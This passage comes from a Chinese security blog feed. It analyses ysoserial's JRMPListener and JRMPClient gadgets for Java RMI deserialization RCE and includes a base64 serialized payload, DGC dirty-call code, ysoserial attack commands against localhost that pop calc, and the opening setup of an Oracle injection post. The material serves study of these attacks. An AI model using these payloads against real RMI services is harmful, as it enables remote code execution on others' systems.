class="line"></span><br><span class="line">           <span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;resource&quot;</span> )</span><br><span class="line">           <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">           objOut.writeLong(<span class="number">2</span>); <span class="comment">// DGC ObjID</span></span><br><span class="line">           objOut.writeInt(<span class="number">0</span>);</span><br><span class="line">           objOut.writeLong(<span class="number">0</span>);</span><br><span class="line">           objOut.writeShort(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">           objOut.writeInt(<span class="number">1</span>); <span class="comment">// dirty opnum is 1</span></span><br><span class="line">           objOut.writeLong(-<span class="number">669196253586618813L</span>); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">           objOut.writeObject(payloadObject); <span class="comment">//will be unmarshaled as the first parameter</span></span><br><span class="line"></span><br><span class="line">           os.flush();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> ( dos != <span class="literal">null</span> ) &#123;</span><br><span class="line">               dos.close();</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> ( s != <span class="literal">null</span> ) &#123;</span><br><span class="line">               s.close();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177158092-5dce2c54-bca2-4944-9a58-595410a99ea5.png#averageHue=%23292e38&clientId=ud9a21f8b-e36e-4&from=paste&height=620&id=ud8272d61&originHeight=620&originWidth=817&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83230&status=done&style=none&taskId=u78589cbb-8523-49d9-814d-e294ade258c&title=&width=817" alt="image.png"><br>这里对应<code>objOut.writeLong(-669196253586618813L);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177216715-561dceaa-b470-45a2-9c93-72d9b9888570.png#averageHue=%23282d37&clientId=ud9a21f8b-e36e-4&from=paste&height=549&id=u73c07c2a&originHeight=549&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62199&status=done&style=none&taskId=uaea07c99-1f2f-4e6c-81d7-2ffe507b830&title=&width=1080" alt="image.png"><br>对应<code>objOut.writeInt(1); // dirty opnum is 1</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177271426-ca8c1120-f802-4f6f-b6d9-f9d9324b125f.png#averageHue=%23292e37&clientId=ud9a21f8b-e36e-4&from=paste&height=432&id=ubf0dff37&originHeight=432&originWidth=1058&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63204&status=done&style=none&taskId=u911a94dc-a343-4bf7-a2fe-710db764f92&title=&width=1058" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703177279218-4422ac5d-ecd1-4f0f-a752-178eb1eb84ec.png#averageHue=%23282d35&clientId=ud9a21f8b-e36e-4&from=paste&height=379&id=ue446d667&originHeight=379&originWidth=945&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52905&status=done&style=none&taskId=u04f49c2f-e1d2-4702-80a1-394a52733c9&title=&width=945" alt="image.png"><br>也就导致了反序列化，其他的write往前追溯都可以找到。<br>这里就对应上述payload中的write一系列。</p><h1 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h1><p>payload模块对应的其实都是gadgets，rmi也有所谓的gadgets</p><h2 id="JRMPListenr-1"><a href="#JRMPListenr-1" class="headerlink" title="JRMPListenr"></a>JRMPListenr</h2><p>首先payload&#x2F;JRMPListenr的作用体现在，会让存在反序列化入口点的地方，主动开启一个恶意的端口，然后当我们往这个开启的端口送入恶意的参数时就会触发反序列化，从而导致RCE。这个payload用到的地方不太多。但是流程很有趣。</p><h3 id="流程分析-1"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>其实我自己是比较习惯于正向分析一波先，但是这里为了让条理清晰一点，我选择逆向分析payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703174183925-e8bfabe2-3b7d-409d-bf35-64bc0ba0e4b9.png#averageHue=%23626670&clientId=ud9a21f8b-e36e-4&from=paste&height=293&id=u8805afd0&originHeight=293&originWidth=1155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=552331&status=done&style=none&taskId=u05e0bbf8-2e46-42cc-a140-ac0b1c60eae&title=&width=1155" alt="image.png"><br><code>java -jar ysoserial-all.jar JRMPListener 8888|base64</code>，使用这个payload<br>准备一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Naming.lookup(&quot;rmi://127.0.0.1:7777/xxxx&quot;);</span></span><br><span class="line">        SerializeUtils.base64deserial(<span class="string">&quot;rO0ABXNyACJzdW4ucm1pLnNlcnZlci5BY3RpdmF0aW9uR3JvdXBJbXBsT+r9SAwuMqcCAARaAA1ncm91cEluYWN0aXZlTAAGYWN0aXZldAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAHZ3JvdXBJRHQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Hcm91cElEO0wACWxvY2tlZElEc3QAEExqYXZhL3V0aWwvTGlzdDt4cgAjamF2YS5ybWkuYWN0aXZhdGlvbi5BY3RpdmF0aW9uR3JvdXCVLvKwBSnVVAIAA0oAC2luY2FybmF0aW9uTAAHZ3JvdXBJRHEAfgACTAAHbW9uaXRvcnQAJ0xqYXZhL3JtaS9hY3RpdmF0aW9uL0FjdGl2YXRpb25Nb25pdG9yO3hyACNqYXZhLnJtaS5zZXJ2ZXIuVW5pY2FzdFJlbW90ZU9iamVjdEUJEhX14n4xAgADSQAEcG9ydEwAA2NzZnQAKExqYXZhL3JtaS9zZXJ2ZXIvUk1JQ2xpZW50U29ja2V0RmFjdG9yeTtMAANzc2Z0AChMamF2YS9ybWkvc2VydmVyL1JNSVNlcnZlclNvY2tldEZhY3Rvcnk7eHIAHGphdmEucm1pLnNlcnZlci5SZW1vdGVTZXJ2ZXLHGQcSaPM5+wIAAHhyABxqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlT2JqZWN002G0kQxhMx4DAAB4cHcSABBVbmljYXN0U2VydmVyUmVmeAAAIrhwcAAAAAAAAAAAcHAAcHBw&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(System.currentTimeMillis());</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的while循环是为了让进程不结束，因为我们要开端口的，程序结束了那么啥都结束了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> * UnicastRef.newCall(RemoteObject, Operation[], int, long)</span><br><span class="line"> * DGCImpl_Stub.dirty(ObjID[], long, Lease)</span><br><span class="line"> * DGCClient$EndpointEntry.makeDirtyCall(Set&lt;RefEntry&gt;, long)</span><br><span class="line"> * DGCClient$EndpointEntry.registerRefs(List&lt;LiveRef&gt;)</span><br><span class="line"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line"> * LiveRef.read(ObjectInput, boolean)</span><br><span class="line"> * UnicastRef.readExternal(ObjectInput)</span><br><span class="line"> *</span><br><span class="line"> * Thread.start()</span><br><span class="line"> * DGCClient$EndpointEntry.&lt;init&gt;(Endpoint)</span><br><span class="line"> * DGCClient$EndpointEntry.lookup(Endpoint)</span><br><span class="line"> * DGCClient.registerRefs(Endpoint, List&lt;LiveRef&gt;)</span><br><span class="line"> * LiveRef.read(ObjectInput, boolean)</span><br><span class="line"> * UnicastRef.readExternal(ObjectInput)</span><br><span class="line"> *</span><br></pre></td></tr></table></figure><p>Yso给出了调用栈，我们跟着来一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176465497-aa4c097e-448b-4fda-b9b4-c1352cc9a339.png#averageHue=%2343535c&clientId=ud9a21f8b-e36e-4&from=paste&height=567&id=u7084669e&originHeight=567&originWidth=1947&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156290&status=done&style=none&taskId=u5c5e296e-3e25-4d4e-b9e6-a7f5bce5afd&title=&width=1947" alt="image.png"><br>reexport函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176492181-e31abf94-d341-4ee6-8891-36981ad0a2b7.png#averageHue=%232a2e34&clientId=ud9a21f8b-e36e-4&from=paste&height=1294&id=u265c11dc&originHeight=1294&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=330118&status=done&style=none&taskId=uc93dc796-d5d2-4bfc-9090-7079ca7960d&title=&width=1903" alt="image.png"><br>这里就是我们payload里的ActiveGroupImpl了。我们准备把他export。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176520561-a77e160c-c81e-4c8e-a2c0-b17d05e32808.png#averageHue=%232d313a&clientId=ud9a21f8b-e36e-4&from=paste&height=832&id=u4491e31b&originHeight=832&originWidth=1465&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=125630&status=done&style=none&taskId=udf304574-0b19-4ee6-a968-99bc0b533a3&title=&width=1465" alt="image.png"><br>用UnicastServerRef包裹了一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176544759-a56d4515-7dd6-4a0d-a164-0a79ffef6b33.png#averageHue=%232a2e34&clientId=ud9a21f8b-e36e-4&from=paste&height=715&id=u8bacf9f3&originHeight=715&originWidth=1649&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90423&status=done&style=none&taskId=udea338a5-1d4c-43d0-842b-e309e4d6912&title=&width=1649" alt="image.png"><br>这里就是一直export，我直接跳过了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176737388-e33663ab-190f-4e00-b4dc-23db04d56196.png#averageHue=%23303540&clientId=ud9a21f8b-e36e-4&from=paste&height=420&id=u844da388&originHeight=420&originWidth=1553&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55654&status=done&style=none&taskId=ud77a25eb-e3ff-40a5-8cde-7a8fcd26c84&title=&width=1553" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176856833-da51e2e3-647e-4819-987a-5888e83f1bde.png#averageHue=%23282d36&clientId=ud9a21f8b-e36e-4&from=paste&height=207&id=u81c87da6&originHeight=207&originWidth=975&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34358&status=done&style=none&taskId=u4106b137-2854-40dc-aaa6-b22f54bc305&title=&width=975" alt="image.png"><br>到这里就listen开启监听了。然后我们就可以用<code>exploit/jrmpclient</code>去攻击这个地方了。<br><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 8888 CommonsCollections6 calc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">readObject:297, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1058, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">dispatch:-1, DGCImpl_Skel (sun.rmi.transport)</span><br><span class="line">oldDispatch:410, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:268, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:568, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:790, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1052690258 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>放一下stack，我们创建的listener接受到了请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176934080-fcc50ee1-e624-4626-8ca1-0ce63910367b.png#averageHue=%23334d65&clientId=ud9a21f8b-e36e-4&from=paste&height=1089&id=ub87acbd3&originHeight=1089&originWidth=2065&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=284651&status=done&style=none&taskId=u6c216e18-3591-4869-b49b-61afbbf12a9&title=&width=2065" alt="image.png"><br>我们这其实是攻击了服务端的DGC，可以看到左下角的DGC_SKEL，然后会对请求进行原生的反序列化，也就导致了RCE。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703176973338-3133d771-9145-4d3e-98cf-34d8e8dd0074.png#averageHue=%235c7a70&clientId=ud9a21f8b-e36e-4&from=paste&height=824&id=u6596bcec&originHeight=824&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93022&status=done&style=none&taskId=u95f36442-f4b7-4d6d-abc9-f1c777b54cf&title=&width=1102" alt="image.png"></p><h2 id="JRMPClient-1"><a href="#JRMPClient-1" class="headerlink" title="JRMPClient"></a>JRMPClient</h2><p>payloads&#x2F;JRMPClient，这个gadgets是最常用的也是实战意义比较大的一个。它可以让反序列化点主动发起一个JRMP请求，然后我们配合exploit&#x2F;JRMPListener开启一个监听。这样的话就可以成功的让client被攻击。是一种主动请求的方式。</p><h3 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 7777 CommonsCollections6 calc</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231727648-4e517bff-c280-4478-91f0-3c7b4a8733f9.png#averageHue=%23292d34&clientId=udefe1118-b9a4-4&from=paste&height=746&id=u441ab5cd&originHeight=932&originWidth=1752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=196989&status=done&style=none&taskId=u5ec2927f-5554-4385-92e0-ec39c042ab7&title=&width=1401.6" alt="image.png"><br><code> java -jar ysoserial-all.jar JRMPClient 127.0.0.1:8888|base64</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231754106-975a7af3-7857-42dd-9bc2-707c65eefb4d.png#averageHue=%235f636e&clientId=udefe1118-b9a4-4&from=paste&height=110&id=u8f080803&originHeight=137&originWidth=1063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240473&status=done&style=none&taskId=u4a48c112-1fd4-4a16-a16b-6f51cc38cb2&title=&width=850.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231731763-ecf10189-7843-4402-add3-83b1b4bc08f8.png#averageHue=%23233c36&clientId=udefe1118-b9a4-4&from=paste&height=702&id=u39f1102d&originHeight=878&originWidth=1803&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79171&status=done&style=none&taskId=u3511cbb5-4e42-4abb-805c-d15a34f07d2&title=&width=1442.4" alt="image.png"><br>成功弹出计算机，这个方法的原理刚刚也说了，我们逆向跟一下流程。首先我们看一下Yso的payloads怎么构造的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>他用了一个<code>RemoteObjectInvocationHandler</code>去包裹我们的<code>UnicastRef</code>，然后在<code>RemoteObjectInvocationHandler</code>时<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231840740-bed2fc4b-ee18-4374-8a0a-feb485bc9b25.png#averageHue=%232b2f35&clientId=udefe1118-b9a4-4&from=paste&height=447&id=u3054373f&originHeight=559&originWidth=2371&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141826&status=done&style=none&taskId=u6992db8b-6ac3-48a4-b709-930af2c7894&title=&width=1896.8" alt="image.png"><br>调用了UnicastRef的<code>readExternal</code>方法。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231871599-c7fb457c-173c-4966-949b-2c7c4a83aacf.png#averageHue=%23292d35&clientId=udefe1118-b9a4-4&from=paste&height=706&id=ud92f0560&originHeight=882&originWidth=1628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111972&status=done&style=none&taskId=u9911a13f-6e2f-478b-a829-b7c1c72bda0&title=&width=1302.4" alt="image.png"><br>调用了LiveRef的read<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703231929395-571706cc-79e3-44ca-8438-7c95db915951.png#averageHue=%23292f39&clientId=udefe1118-b9a4-4&from=paste&height=127&id=u1354e399&originHeight=159&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19262&status=done&style=none&taskId=u0914eae7-6cf2-490d-99e9-3472257a770&title=&width=822.4" alt="image.png"><br><code>DGCClient.registerRefs</code>，到了DGC处理部分了。</p><blockquote><p>在之前的调试过程中，也曾看到过 DGC 相关的代码，不过没有分析，统一在这里来说。<br>DGC（Distributed Garbage Collection）—— 分布式垃圾回收，当 Server 端返回一个对象到 Client 端（远程方法的调用方）时，其跟踪远程对象在 Client 端中的使用。当再没有更多的对 Client 远程对象的引用时，或者如果引用的“租借”过期并且没有更新，服务器将垃圾回收远程对象。启动一个 RMI 服务，就会伴随着 DGC 服务端的启动。<br>RMI 定义了一个 java.rmi.dgc.DGC 接口，提供了两个方法 dirty 和 clean：</p><ul><li>客户端想要使用服务端上的远程引用，使用 dirty 方法来注册一个。同时这还跟租房子一样，过段时间继续用的话还要再调用一次来续租。</li><li>客户端不使用的时候，需要调用 clean 方法来清楚这个远程引用。</li></ul></blockquote><p>这个接口有两个实现类，分别是 sun.rmi.transport.DGCImpl 以及 sun.rmi.transport.DGCImpl_Stub，同时还定义了 sun.rmi.transport.DGCImpl_Skel。</p><blockquote><p>引自Su18</p></blockquote><p>这里是客户端DGC注册Ref<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232064242-8c00e78c-8d34-4472-8291-5edcb67f51b9.png#averageHue=%232e323b&clientId=udefe1118-b9a4-4&from=paste&height=613&id=ue77a2142&originHeight=766&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112520&status=done&style=none&taskId=ub34086b4-2d58-4ff5-8778-7f307d5214e&title=&width=1040.8" alt="image.png"><br>进入<code>registerRefs</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232088623-d4e91f7c-5508-450a-a868-dfcdf45f1ad7.png#averageHue=%2330333a&clientId=udefe1118-b9a4-4&from=paste&height=424&id=ua1416a2f&originHeight=530&originWidth=1547&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73868&status=done&style=none&taskId=u60fc9009-107c-4ae6-a3dd-cb679803613&title=&width=1237.6" alt="image.png"><br>在这里要发起DirtyCall了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232161438-713be3bf-cfe2-4731-aebf-f52b4c43cc37.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=452&id=ub53066b7&originHeight=565&originWidth=1416&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84263&status=done&style=none&taskId=u80c54bc4-a567-4c8a-987b-7b5a674c13b&title=&width=1132.8" alt="image.png"><br>dirty方法发起请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232184253-b9c4d7dd-799d-42f3-bd90-9a5b71a27bfe.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=678&id=u5d0ea853&originHeight=848&originWidth=1499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126854&status=done&style=none&taskId=ud32b0520-5934-48d3-82c4-5c8245050e8&title=&width=1199.2" alt="image.png"><br>进而回到了UnicastRef的newcall方法发起请求<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232201163-135a501e-8894-4725-8e77-215888123fa2.png#averageHue=%232f333e&clientId=udefe1118-b9a4-4&from=paste&height=410&id=u542cdd8e&originHeight=513&originWidth=1878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91738&status=done&style=none&taskId=u5b2a87f7-0538-40d3-bd9b-7d5ebee75e0&title=&width=1502.4" alt="image.png"><br>至此完成主动访问Evil server的流程，Evil server返回payload给客户端进行Deser<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1703232248386-3bfd5059-439f-44a7-ace5-d149d5dbfcc7.png#averageHue=%232a2e35&clientId=udefe1118-b9a4-4&from=paste&height=585&id=u46d2390e&originHeight=731&originWidth=1708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112851&status=done&style=none&taskId=uacdf3211-6a06-4d13-bd98-0170b06f330&title=&width=1366.4" alt="image.png"><br>结束。</p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>还是感觉Yso这2个payload是挺有意思的，大家可以自己去尝试尝试，别搞混淆了，JRMP是RMI具有实战意义的gadgets，分析其中的流程可以让大家更好的理解RMI发序列化。到这里也算给自己的RMI做个小结。</p>]]></content>
    
    
    <summary type="html">QWQ</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="Java" scheme="http://boogipop.com/tags/Java/"/>
    
    <category term="RMI" scheme="http://boogipop.com/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Oracle 注入 RCE 由浅入深</title>
    <link href="http://boogipop.com/2024/02/29/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/"/>
    <id>http://boogipop.com/2024/02/29/Oracle%20%E6%B3%A8%E5%85%A5%20RCE%20%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/</id>
    <published>2024-02-29T00:42:24.000Z</published>
    <updated>2024-02-29T00:42:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章在先知社区首发</p><p>京麒 CTF ez_oracle 中出现了oracle有关的rce注入。但是由于对oracle不熟悉导致没写出来，现在来学习一下oracle针对于rce的学习。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>oracle提权是有版本限制的，因此也是比较好玩的- -，这里选用oracle 11g 112010<br><a href="https://www.oracle.com/partners/campaign/112010-win64soft-094461.html">https://www.oracle.com/partners/campaign/112010-win64soft-094461.html</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702399613751-252578d7-fea3-46f6-8165-5b629ed6ed13.png#averageHue=%23f3f1ef&clientId=u318fcfe2-010e-4&from=paste&height=211&id=u6e5c063f&originHeight=211&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28891&status=done&style=none&taskId=u9a8c301b-ee5f-4805-87ee-c5117a287fe&title=&width=811" alt="image.png"><br>注意这2个zip都需要下载，然后将他们解压到一个文件夹下，如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402451441-c85050d1-0a0e-4d65-87cd-848e8a3f62a0.png#averageHue=%23fdfcfc&clientId=u318fcfe2-010e-4&from=paste&height=752&id=u1bee3def&originHeight=752&originWidth=1147&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56194&status=done&style=none&taskId=uf17f82ad-f700-4929-bc1d-b8591a2a205&title=&width=1147" alt="image.png"><br>最后只要一直往下点下一步就可以安装完毕了，安装完后会让你设置密码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1702402472019-fab51494-3be7-4e32-9845-11a480d03ed0.png#averageHue=%23f2f3e0&clientId=u318fcfe2-010e-4&from=paste&height=378&id=u4a274337&originHeight=378&originWidth=583&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10196&status=done&style=none&taskId=u476888d0-a974-4968-bd60-d4727541bfe&title=&width=583" 